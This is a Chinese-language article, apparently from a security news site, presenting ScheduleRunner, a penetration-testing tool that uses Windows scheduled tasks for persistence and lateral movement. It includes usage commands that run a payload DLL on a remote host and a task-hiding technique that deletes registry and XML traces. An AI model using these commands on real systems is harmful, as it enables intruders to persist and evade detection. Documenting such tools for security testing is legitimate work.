![](https://image.3001.net/images/20220416/1650107918_625aa60ea914d711ef8c2.jpeg!small)

## 关于ScheduleRunner

通过“计划任务”来实现渗透测试是过去十年中最流行的技术之一，而且该技术也是目前网络安全研究人员在实现持久化和横向移动时说普遍使用的。

在此之前，社区已经有很多相关的C#工具了，但这些工具多多少少都会有一些局限性。因此，ScheduleRunner便应运而生。ScheduleRunner同样也是一款基于C#开发的安全测试工具，该工具提供了高度定制化开发支持，灵活性也非常高，可以在渗透测试活动中帮助广大研究人员通过“计划任务”来实现持久化和横向移动任务。

## 工具方法

 ** **方法****

|

 ** **功能****  
  
---|---  
  
create

|

创建一个新的计划任务  
  
delete

|

删除一个计划任务  
  
run

|

执行一个计划任务  
  
query

|

查询计划任务详情，或查看目录下的全部计划任务  
  
queryfolders

|

查询所有子文件夹中的计划任务  
  
move

|

使用计划任务（自动创建、运行和删除）执行横向移动  
  
## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/netero1010/ScheduleRunner.git

## 工具使用

创建一个名为“Cleanup”的计划任务，并在每天23:30执行：

    
    
    ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:daily /starttime:23:30 /program:calc.exe /description:"Some description" /author:netero1010

创建一个名为“Cleanup”的计划任务，并在远程服务器上每4个小时执行一次：

    
    
    ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:hourly /modifier:4 /program:rundll32.exe /argument:c:\temp\payload.dll /remoteserver:TARGET-PC01

删除一个名为“Cleanup”的计划任务：

    
    
    ScheduleRunner.exe /method:delete /taskname:Cleanup

执行一个名为“Cleanup”的计划任务：

    
    
    ScheduleRunner.exe /method:run /taskname:Cleanup

查询远程服务器中“\Microsoft\Windows\CertificateServicesClient”目录下名为“Cleanup”的计划任务详情：

    
    
    ScheduleRunner.exe /method:query /taskname:Cleanup /folder:\Microsoft\Windows\CertificateServicesClient /remoteserver:TARGET-PC01

查询远程服务器中“\Microsoft\Windows\CertificateServicesClient”目录下的所有计划任务：

    
    
    ScheduleRunner.exe /method:query /folder:\Microsoft\Windows\CertificateServicesClient /remoteserver:TARGET-PC01

查询计划任务中所有的子目录：

    
    
    ScheduleRunner.exe /method:queryfolders

使用指定的用户账号在远程服务器中通过计划任务执行横向移动：

    
    
    ScheduleRunner.exe /method:move /taskname:Demo /remoteserver:TARGET-PC01 /program:rundll32.exe /argument:c:\temp\payload.dll /user:netero1010

使用计划任务隐藏技术创建一个名为“Cleanup”的计划任务：

    
    
    ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:daily /starttime:23:30 /program:calc.exe /description:"Some description" /author:netero1010 /technique:hide

删除使用了计划任务隐藏技术创建的名为“Cleanup”的计划任务：

    
    
    ScheduleRunner.exe /method:delete /taskname:Cleanup /technique:hide

## 隐藏计划任务

![](https://image.3001.net/images/20220416/1650107986_625aa65236eaa370c689c.png!small)

这项技术是HAFNIUM团队一直在使用的，近期才被微软所发现。该技术的使用需要“NT
AUTHORITY/SYSTEM”权限，接下来ScheduleRunner将会执行下列操作：

> 1、从“HKLM\SOFTWARE\Microsoft\Windows
> NT\CurrentVersion\Schedule\TaskCache\Tree\\[task name]”删除“SD”值；
>
> 2、删除计划任务XML文件“C:\Windows\System32\Tasks\\[task name]”；

如果想要删除此技术创建的计划任务，则需要在delete方法中添加“/technique:hide”以正确删除任务。

## 技术限制

如果任务是通过注册表删除的话，那么该任务仍然会在下次系统重新启动时继续运行。因此，最好不要在服务器上使用这种技术来进行操作。

## 工具运行截图

![](https://image.3001.net/images/20220416/1650108022_625aa67659b75786277d1.png!small)

## 项目地址

 **ScheduleRunner：** 【[
_GitHub传送门_](https://github.com/netero1010/ScheduleRunner)】

## 参考资料

> [
> _https://github.com/dahall/TaskScheduler_](https://github.com/dahall/TaskScheduler)
>
> [
> _https://github.com/mandiant/SharPersist_](https://github.com/mandiant/SharPersist)
>
> [ _https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-> scheduled-tasks-for-defense-> evasion/_](https://www.microsoft.com/security/blog/2022/04/12/tarrask-> malware-uses-scheduled-tasks-for-defense-evasion/)

